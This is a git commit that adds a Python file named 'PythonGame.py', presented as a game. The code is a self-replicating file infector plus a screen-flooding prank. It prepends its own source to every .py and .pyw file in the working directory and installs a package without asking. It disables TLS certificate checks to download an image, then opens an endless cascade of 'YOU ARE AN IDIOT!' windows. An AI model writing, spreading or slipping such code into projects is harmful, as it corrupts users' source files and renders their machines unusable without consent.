b79ed33de80d4edc763824474439b41b10cd4a4a
dsajadhsa <112852411+dsajadhsa@users.noreply.github.com>
2023-02-26 17:49:22 +0700

    Add files via upload

---
+++ PythonGame.py
@@ -0,0 +1,118 @@
+# SCRIPT SAYS HI!
+import sys, site
+
+if sys.version_info[0] ==3 and sys.version_info[1]>=5:
+    pass
+else:
+    raise Exception("Must be using Python 3.5 or newer, but not python 4")
+
+import tkinter as tk
+import random
+import pip
+import glob
+
+try:
+    from PIL import ImageTk, Image
+except ImportError:
+    if hasattr(pip, 'main'):
+        pip.main(['install', '--user', 'pillow'])
+    else:
+        import pip._internal
+        pip._internal.main(['install', '--user', 'pillow'])
+        
+    from importlib import reload
+    reload(site)
+    from PIL import ImageTk, Image
+
+from io import BytesIO
+import urllib.request as request
+import ssl
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+root = tk.Tk()
+
+URL="https://static.wikia.nocookie.net/4bd8663d-60d4-439b-826f-3cef40dab31b/scale-to-width/755"
+response = request.urlopen(URL, context=ctx)
+img_data = response.read()
+h=BytesIO(img_data)
+open_i=Image.open(h)
+imagen = open_i.resize((400, 400), Image.ANTIALIAS)
+image = ImageTk.PhotoImage(imagen)
+
+def startInfiniteLoop():
+    i = 0
+    otherFrame = []
+    while True:
+        tkl=tk.Toplevel()
+        if tkl.winfo_screenwidth() > 1800:
+            x = random.randint(-650, 1400)
+        elif tkl.winfo_screenwidth() > 1500:
+            x = random.randint(-600, 1200)
+        elif tkl.winfo_screenwidth() > 1250:
+            x = random.randint(-600, 900)
+        else:
+            x = random.randint(-500, 800)
+        y =  random.randint(-550, 550)
+        tkl.geometry("+%d+%d" % (x + 400, y + 400))
+        tkl.title("YOU ARE AN IDIOT!")
+        label = tk.Label(tkl, image=image)
+        label.pack(fill="both")
+        otherFrame.append(tkl)
+        i += 1
+        tkl.update()
+        if i%500 == 0:
+            root.update()
+
+script_code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines:
+    if line == "# SCRIPT SAYS HI!":
+        self_replicating_part = True
+    if not self_replicating_part:
+        script_code.append(line)
+    if line == "# SCRIPT SAYS BYE!\n":
+        break
+
+python_files = glob.glob('*.py') + glob.glob('*.pyw')
+
+for file in python_files:
+    with open(file, 'r') as f:
+        file_code = f.readlines()
+
+    implanted = False
+
+    for line in file_code:
+        if line == "# SCRIPT SAYS HI!\n":
+            implanted = True
+            break
+
+    if not implanted:
+        final_code = []
+        final_code.extend(script_code)
+        final_code.extend('\n')
+        final_code.extend(file_code)
+
+        with open(file, 'w') as f:
+            f.writelines(final_code)
+            
+def IDIOT():
+    print("YOU ARE AN IDIOT!")
+
+label = tk.Label(root, image=image)
+label.pack(fill='both')
+IDIOT()
+startInfiniteLoop()
+root.mainloop()
+
+# SCRIPT SAYS BYE!
+
+
+
+
+
